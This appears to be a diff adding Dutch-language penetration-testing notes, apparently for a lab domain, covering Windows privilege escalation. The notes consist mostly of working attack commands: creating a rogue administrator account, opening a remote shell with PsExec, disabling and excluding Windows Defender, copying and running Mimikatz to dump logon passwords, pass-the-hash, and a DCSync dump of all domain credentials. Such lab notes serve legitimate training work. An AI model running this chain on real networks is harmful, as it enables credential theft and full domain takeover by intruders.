@@ -29,5 +29,32 @@ cmd /c net user fakeadmin2 L3tm3!n /add && net localgroup administrators fakeadm
 Sysinternals check schrijfrechten:
 Accesschk -uwvqc “Everyone” *
 
+-----------------Privilege Escalation------------------------
 
+Angry IP scanner downloaden van internet
+IP zoeken van adminPC 
 
+Verbinding maken met AdminPC 
+Psexec \\192.168.178.24 cmd /accepteula
+Vervolgens PowerShell command en windows defender uitzetten op AdminPC 
+
+Windows defender exclusion op Admin PC
+Add-MpPreference -ExclusionPath "X:\"
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+Mimikatz kopieren van lowpriv naar adminPC in andere cmd prompt
+xcopy C:\Temp\mimikatz_trunk\x64\*.* X:\
+\\IP_adminpc\c$
+
+Mimikatz runnen op de adminPC via zelfde cmd prompt scherm (dus exit van PowerShell)
+privilege::debug
+sekurlsa::logonpasswords
+
+Open nieuwe cmd prompt op lowpriv met localadmin --> ga naar mimikatz
+privilege::debug
+sekurlsa::pth /user:[insert user] /domain:[insert domain] /ntlm:[insert ntlm] /run:cmd
+Voorbeeld: 
+sekurlsa::pth /user:tomadmin /domain:CSTLAB.local /ntlm:cjsfjhfjsdhfjdsfjf /run:cmd
+
+Nieuwe cmd prompt opent: Ga weer naar Mimikatz
+lsadump::dcsync /csv /all
